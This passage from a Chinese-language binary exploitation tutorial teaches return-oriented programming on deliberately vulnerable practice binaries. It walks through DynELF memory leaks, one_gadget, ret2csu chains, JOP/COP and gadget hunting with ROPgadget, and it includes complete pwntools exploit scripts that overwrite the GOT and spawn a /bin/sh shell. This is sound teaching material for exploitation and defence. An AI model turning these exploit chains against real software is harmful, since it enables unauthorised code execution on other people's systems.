   payload += p32(elf.plt['write']) + p32(main) + p32(1) + p32(addr) + p32(4)
   p.send(payload)
   return p.recv(4)
# 任意内存写函数，通过ROP调用read函数王任意地址内存写入数据，最后回到main，实现反复触发
def poke(addr, data):
   payload = b'A' * 0x8c
   payload += p32(elf.plt['read']) + p32(main) + p32(0) + p32(addr) + p32(len(data))
   p.send(payload)
   p.send(data)
# 将任意内存泄露函数peek传入DynELF
d = DynELF(peek, elf=elf)
# DynELF模块可实现任意库中的任意符号解析，例如system
system = d.lookup("system", "libc.so")
print('system={}'.format(hex(system)))
# 将要执行的命令写入.bss section
poke(bss, '/bin/sh\0')

# 通过ROP运行system(cmd)
do_rop(p32(system) + p32(0xdeadbeef) + p32(bss))

p.interactive()
```




## OneGadget

**一个gadget执行/bin/sh**
通常执行system("/bin/sh")需要在调用system之前传递参数；
比较神奇的是，libc中包含一些gadget，直接跳转过去即可启动shell；
通常通过寻找字符串"/bin/sh"的引用来寻找(对着/bin/sh的地址在IDA Pro中按X)

> 由于调用约定限制，one_gadget在32位上约束条件通常比在64位上更复杂，所以64位上利用起来更方便。具体原因细节可参考[链接](https://xz.aliyun.com/t/2720)

```
000000000003F76A  mov     rax, cs:environ_ptr_0
000000000003F771  lea     rdi, aBinSh     ; "/bin/sh"
000000000003F778  lea     rsi, [rsp+188h+var_158]
000000000003F77D  mov     cs:lock_3, 0
000000000003F787  mov     cs:sa_refcntr, 0
000000000003F791  mov     rdx, [eax]
000000000003F794  call    execve
000000000003F799  mov     edi, 7Fh        ; status
000000000003F79E  call    _exit
000000000003F79E  do_system endp
000000000003F79E
...
00000000000D7557  mov     rax, cs:environ_ptr_0
00000000000D755E  lea     rsi, [rsp+1D8h+var_168]
00000000000D7563  lea     rdi, aBinSh     ; "/bin/sh"
00000000000D756A  mov     rdx, [eax]
00000000000D756D  call    execve
00000000000D7572  call    abort
...
00000000000E7216  mov     rax, cs:environ_ptr_0
00000000000E721D  lea     rsi, [rsp+1C8h+var_168]
00000000000E7222  lea     rdi, aBinSh     ; "/bin/sh"
00000000000E7229  mov     rdx, [eax]
00000000000E722C  call    execve
00000000000E7231  call    abort
...
```

可以通过onegadget工具进行查找

```
$ one_gadget libc.so.6
0x3d0d3 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x3d0d5 execve("/bin/sh", esp+0x38, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x38] == NULL

0x3d0d9 execve("/bin/sh", esp+0x3c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x3c] == NULL
```

**案例：onegadget**

```
//gcc bof.c -fno-stack-protector -no-pie -obof
#include <unistd.h>

int main(int argc, char *argv[])
{
    char buf[32];
    write(1, "PWNME\n", 6);
    read(0, buf, 512);
    return 0;
}
```

找到的onegadget条件是r15和r12都为0即可，刚好ret2csu末尾的pop ret可以用来控制寄存器，就不用额外找popret gadget了。

同样也利用了got hijack，在一次溢出中完成了攻击，通过两个连续的ret2csu先调用write@got泄露的write@got，然后调用read@got覆写write@got为one_gadget，最终再调用write@plt触发onegadget。其中第一次ret2csu结尾的popret也利用起来了为第二次ret2csu准备参数，同样第二次ret2csu结尾的popret则为onegadget构造条件将r15和r12寄存器置为0，完成整个攻击。

另外注意可覆写的缓存区长度是否足够放下构造的ROP，由于该ROP构造链较长，又是64位，故payload长度相对长一些，而程序中允许的最长payload是512字节是足够的，如果程序中读入字节数较少，则可以考虑stack pivot扩展栈空间，或多次溢出来减少payload长度。

整个Exploit如下：

```
#!/usr/bin/env python

from pwn import *
context.log_level = 'debug'

elf = ELF('./bof')
libc = elf.libc
p = process(elf.path)
pause()

'''
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
 [r15] == NULL || r15 == NULL
 [r12] == NULL || r12 == NULL
'''
'''
0x00000000004011e0 <+64>:  mov  rdx,r14
0x00000000004011e3 <+67>:  mov  rsi,r13
0x00000000004011e6 <+70>:  mov  edi,r12d
0x00000000004011e9 <+73>:  call  QWORD PTR [r15+rbx*8]
0x00000000004011ed <+77>:  add  rbx,0x1
0x00000000004011f1 <+81>:  cmp  rbp,rbx
0x00000000004011f4 <+84>:  jne  0x4011e0 <__libc_csu_init+64>
0x00000000004011f6 <+86>:  add  rsp,0x8
0x00000000004011fa <+90>:  pop  rbx
0x00000000004011fb <+91>:  pop  rbp
0x00000000004011fc <+92>:  pop  r12
0x00000000004011fe <+94>:  pop  r13
0x0000000000401200 <+96>:  pop  r14
0x0000000000401202 <+98>:  pop  r15
0x0000000000401204 <+100>:  ret
'''

onegadget = 0xe6c7e
ret2csu_gadget1 = 0x4011e0
ret2csu_gadget2 = 0x4011f6

p.recvuntil('PWNME\n')
payload = b'A' * 40
payload += p64(ret2csu_gadget2)
payload += p64(0)
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(1) # r12,edi
payload += p64(elf.got['write']) # r13, rsi
payload += p64(8) # r14, rdi
payload += p64(elf.got['write']) # r15
payload += p64(ret2csu_gadget1)
payload += p64(0)
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(0) # r12,edi
payload += p64(elf.got['write']) # r13, rsi
payload += p64(8) # r14, rdi
payload += p64(elf.got['read']) # r15
payload += p64(ret2csu_gadget1)
payload += p64(0) * 7
payload += p64(elf.plt['write'])
p.send(payload)
sleep(1)

write_addr = u64(p.recv(8))
print('write_addr = {}'.format(hex(write_addr)))
libbase = write_addr - libc.sym['write']
onegadget_addr = libbase + onegadget

p.send(p64(onegadget_addr))
p.interactive()
```



## JOP/COP

和ROP类似，只是把使用的代码片段从ret结尾扩展到jmp/call结尾

-  JOP(Jump Oriented Programming)

```
 pop esi; jmp dword [esi-0x70]
```

- COP(Call Oriented Programming)

```
 mov eax, dword [esp+0x48]; call dword [eax+0x10];
```



## 如何防御ROP

- 位置无关代码(PIE)可防御攻击者直接ROP
  - 攻击者不知道代码地址
  - ROP与return to PLT技术无法直接使用
- PIE绕过方法
  - 结合信息泄露漏洞
  - x86_32架构下可爆破
    内存地址随机化粒度以页为单位：0x1000字节对齐



## 补充

### 通过pattern定位溢出返回地址

关于溢出点定位，除了可以通过动态调试计算，也可以通过pwntools的cyclic函数或例如`metasploit`的`pattern_tool.py`脚本辅助定位返回地址。例如使用pattern.py脚本，使用如下命令来生成一串测试用的150个字节的字符串：

```
python pattern.py create 150 
Aa0Aa1Aa2(...skip...)e6Ae7Ae8Ae9
```

随后我们调试程序触发溢出，

```
(gdb) run
Starting program: /home/sh4rk/pwnable/bof
Aa0Aa1Aa2(...skip...)Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
```

我们可以得到内存出错的地址为0x37654136。随后我们使用命令：

```
python pattern.py offset 0x37654136
hex pattern decoded as: 6Ae7
140
```

就可以非常容易的计算出PC返回值的覆盖点为140个字节。我们只要构造一个”A”*140+ret字符串，就可以让pc执行ret地址上的代码了。

#### 使用工具寻找gadgets

x86中参数都是保存在栈上，在x86的ROP时，用到pop;pop;ret这样的gadgets比较多，这类gadgets也比较容易找到。但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。因此在x64上构造ROP经常需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较知名的工具有：

 ROPgadget: https://github.com/JonathanSalwan/ROPgadget
 ROPEME: https://github.com/packz/ropeme
 Ropper: https://github.com/sashs/Ropper
 rp++: https://github.com/0vercl0k/rp

例如我们要通过rop构造system("/bin/sh")调用，需要查找一些gadget。可以使用ROPGadget搜索目标程序中所有pop ret的gadgets：

```
 $ ROPgadget --binary level4 --only "pop|ret"
 Gadgets information
 0x00000000004006d2 : pop rbp ; ret
 0x00000000004006d1 : pop rbx ; pop rbp ; ret
 0x0000000000400585 : ret
 0x0000000000400735 : ret 0xbdb8
```

程序比较小的情况下，找到的gadget比较少，可能找不到我们需要的gadget，例如pop rdi; ret。这时候还可以寻找libc.so中的gadgets，然后再通过计算出偏移量后调用对应的gadgets。

```
 $ ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi
 0x000000000001f27d : pop rdi ; pop rbp ; ret
 0x00000000000205cd : pop rdi ; pop rbx ; pop rbp ; ret
 0x0000000000073033 : pop rdi ; pop rbx ; ret
 0x0000000000022a12 : pop rdi ; ret
```

这次我们成功的找到了“pop rdi; ret”这个gadget了。构造ROP链如下：

```
payload = "\x00"*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
```

另外，如果我们只需调用一次system()函数就可以获取shell，也可以搜索不带ret的gadgets来构造ROP链。

```
 $ ROPgadget --binary libc.so.6 --only "pop|call" | grep rdi
 0x000000000012da1d : call qword ptr [rdi]
 0x0000000000187113 : call qword ptr [rdx + rdi + 0x8f10001]
 0x00000000000f1f04 : call rdi
 0x00000000000f4739 : pop rax ; pop rdi ; call rax
 0x00000000000f473a : pop rdi ; call rax
```

通过搜索结果我们发现，pop rax ; pop rdi ; call rax也可以完成我们的目标。首先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。

 payload = "\x00"*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)

所以说这两个ROP链都可以完成我们的目标，随便选择一个进行攻击即可



#### x64下更多的gadget

上面ret2csu部分讲到了`__libc_csu_init()`的一条万能gadgets，其实不光`__libc_csu_init()`里的代码可以利用，默认gcc还会有如下自动编译进去的函数可以用来查找gadgets。

```
 _init
 _start
 call_gmon_start
 deregister_tm_clones
 register_tm_clones
 __do_global_dtors_aux
 frame_dummy
 __libc_csu_init
 __libc_csu_fini
 _fini
```

除此之外在程序执行的过程中，CPU只会关注于PC指针的地址，并不会关注是否执行了编程者想要达到的效果。因此，通过控制PC跳转到某些经过稍微偏移过的地址会得到意想不到的效果。

比如说说我们反编译一下__libc_csu_init()这个函数的尾部：

```
 gdb-peda$ disas __libc_csu_init
 Dump of assembler code for function __libc_csu_init:
 ……
    0x0000000000400606 <+102>: movrbx,QWORD PTR [rsp+0x8]
    0x000000000040060b <+107>: movrbp,QWORD PTR [rsp+0x10]
    0x0000000000400610 <+112>: mov r12,QWORD PTR [rsp+0x18]
    0x0000000000400615 <+117>: mov r13,QWORD PTR [rsp+0x20]
    0x000000000040061a <+122>: mov r14,QWORD PTR [rsp+0x28]
    0x000000000040061f <+127>: mov r15,QWORD PTR [rsp+0x30]
    0x0000000000400624 <+132>: add rsp,0x38
    0x0000000000400628 <+136>: ret  
```

可以发现我们可以通过rsp控制r12-r15的值，但我们知道x64下常用的参数寄存器是rdi和rsi，控制r12-r15并没有什么太大的用处。不要慌，虽然原程序本身用是为了控制r14和r15寄存器的值。如下面的反编译所示：

```
 gdb-peda$ x/5i 0x000000000040061a
    0x40061a <__libc_csu_init+122>: mov r14,QWORD PTR [rsp+0x28]
    0x40061f <__libc_csu_init+127>: mov r15,QWORD PTR [rsp+0x30]
    0x400624 <__libc_csu_init+132>: add rsp,0x38
    0x400628 <__libc_csu_init+136>: ret  
```

但是我们如果简单的对pc做个位移再反编译，我们就会发现esi和edi的值可以被我们控制了！如下面的反编译所示:

```
 gdb-peda$ x/5i 0x000000000040061b
    0x40061b <__libc_csu_init+123>: movesi,DWORD PTR [rsp+0x28]
    0x40061f <__libc_csu_init+127>: mov r15,QWORD PTR [rsp+0x30]
    0x400624 <__libc_csu_init+132>: add rsp,0x38
    0x400628 <__libc_csu_init+136>: ret    
    0x400629: nop DWORD PTR [rax+0x0]
 gdb-peda$ x/5i 0x0000000000400620
    0x400620 <__libc_csu_init+128>: movedi,DWORD PTR [rsp+0x30]
    0x400624 <__libc_csu_init+132>: add rsp,0x38
    0x400628 <__libc_csu_init+136>: ret    
    0x400629: nop DWORD PTR [rax+0x0]
    0x400630 <__libc_csu_fini>: repz ret 
```


虽然edi和esi只能控制低32位的数值，但已经可以满足我们的很多的rop需求了。

除了程序默认编译进去的函数，如果我们能得到libc.so或者其他库在内存中的地址，就可以获得到大量的可用的gadgets。比如上一篇文章中提到的通用gadget只能控制三个参数寄存器的值并且某些值只能控制32位，如果我们想要控制多个参数寄存器的值的话只能去寻找其他的gadgets了。这里就介绍一个_dl_runtime_resolve()中的gadget，通过这个gadget可以控制六个64位参数寄存器的值，当我们使用参数比较多的函数的时候（比如mmap和mprotect）就可以派上用场了。

我们把_dl_runtime_resolve反编译可以得到：

```
 0x7ffff7def200 <_dl_runtime_resolve>: sub rsp,0x38
 0x7ffff7def204 <_dl_runtime_resolve+4>: mov QWORD PTR [rsp],rax
 0x7ffff7def208 <_dl_runtime_resolve+8>: mov QWORD PTR [rsp+0x8],rcx
 0x7ffff7def20d <_dl_runtime_resolve+13>: mov QWORD PTR [rsp+0x10],rdx
 0x7ffff7def212 <_dl_runtime_resolve+18>: mov QWORD PTR [rsp+0x18],rsi
 0x7ffff7def217 <_dl_runtime_resolve+23>: mov QWORD PTR [rsp+0x20],rdi
 0x7ffff7def21c <_dl_runtime_resolve+28>: mov QWORD PTR [rsp+0x28],r8
 0x7ffff7def221 <_dl_runtime_resolve+33>: mov QWORD PTR [rsp+0x30],r9
 0x7ffff7def226 <_dl_runtime_resolve+38>: movrsi,QWORD PTR [rsp+0x40]
 0x7ffff7def22b <_dl_runtime_resolve+43>: movrdi,QWORD PTR [rsp+0x38]
 0x7ffff7def230 <_dl_runtime_resolve+48>: call 0x7ffff7de8680 <_dl_fixup>
 0x7ffff7def235 <_dl_runtime_resolve+53>: mov r11,rax
 0x7ffff7def238 <_dl_runtime_resolve+56>: mov r9,QWORD PTR [rsp+0x30]
 0x7ffff7def23d <_dl_runtime_resolve+61>: mov r8,QWORD PTR [rsp+0x28]
 0x7ffff7def242 <_dl_runtime_resolve+66>: movrdi,QWORD PTR [rsp+0x20]
 0x7ffff7def247 <_dl_runtime_resolve+71>: movrsi,QWORD PTR [rsp+0x18]
 0x7ffff7def24c <_dl_runtime_resolve+76>: movrdx,QWORD PTR [rsp+0x10]
 0x7ffff7def251 <_dl_runtime_resolve+81>: movrcx,QWORD PTR [rsp+0x8]
 0x7ffff7def256 <_dl_runtime_resolve+86>: movrax,QWORD PTR [rsp]
 0x7ffff7def25a <_dl_runtime_resolve+90>: add rsp,0x48
 0x7ffff7def25e <_dl_runtime_resolve+94>: jmp r11
```

从0x7ffff7def235开始，就是这个通用gadget的地址了。通过这个gadget我们可以控制rdi，rsi，rdx，rcx， r8，r9的值。但要注意的是`_dl_runtime_resolve()`在内存中的地址是随机的。所以我们需要先用information leak得到`_dl_runtime_resolve()`在内存中的地址。那么`_dl_runtime_resolve()`的地址被保存在了哪个固定的地址呢？

通过反编译level5程序我们可以看到write@plt()这个函数使用PLT [0] 去查找write函数在内存中的地址，函数jump过去的地址*0x600ff8其实就是`_dl_runtime_resolve()`在内存中的地址了。所以只要获取到0x600ff8这个地址保存的数据，就能够找到`_dl_runtime_resolve()`在内存中的地址：

```
 0000000000400420 <write@plt-0x10>:
   400420: ff 35 ca 0b 20 00 pushq 0x200bca(%rip) # 600ff0 <_GLOBAL_OFFSET_TABLE_+0x8>
   400426: ff 25 cc 0b 20 00 jmpq *0x200bcc(%rip) # 600ff8 <_GLOBAL_OFFSET_TABLE_+0x10>
   40042c: 0f 1f 40 00 nopl 0x0(%rax)

 gdb-peda$ x/x 0x600ff8
 0x600ff8 <_GLOBAL_OFFSET_TABLE_+16>: 0x00007ffff7def200

 gdb-peda$ x/21i 0x00007ffff7def200
    0x7ffff7def200 <_dl_runtime_resolve>: sub rsp,0x38
    0x7ffff7def204 <_dl_runtime_resolve+4>: mov QWORD PTR [rsp],rax
    0x7ffff7def208 <_dl_runtime_resolve+8>: mov QWORD PTR [rsp+0x8],rcx
    0x7ffff7def20d <_dl_runtime_resolve+13>: mov QWORD PTR 
 [rsp+0x10],rdx
 ….
```

另一个要注意的是，想要利用这个gadget，我们还需要控制rax的值，因为gadget是通过rax跳转的：

```
 0x7ffff7def235 <_dl_runtime_resolve+53>: mov r11,rax
 ……
 0x7ffff7def25e <_dl_runtime_resolve+94>: jmp r11

所以我们接下来用ROPgadget查找一下libc.so中控制rax的gadget：

 ROPgadget --binary libc.so.6 --only "pop|ret" | grep "rax"
 0x000000000001f076 : pop rax ; pop rbx ; pop rbp ; ret
 0x0000000000023950 : pop rax ; ret
 0x000000000019176e : pop rax ; ret 0xffed
 0x0000000000123504 : pop rax ; ret 0xfff0
```

0x0000000000023950刚好符合我们的要求。有了`pop rax`和`_dl_runtime_resolve`这两个gadgets，我们就可以很轻松的调用想要的调用的函数了。



## 参考

- 【长亭科技PWN系列公开课程 #2从栈溢出开始，教你写shellcode和ROP链 2020.04.17 长亭科技安全研究员 郑吉宏】
- 【长亭科技PWN系列公开课程 #3小试牛刀 ROP实战 2020.04.24 长亭科技安全研究员 施伟铭】
- ROP练习 https://ropemporium.com/
- https://bestwing.me/ropemporium-all-writeup.html
- https://blog.r0kithax.com/ctf/infosec/2020/10/20/rop-emporium-ret2csu-x64.html
- glibc里的one gadget https://xz.aliyun.com/t/2720

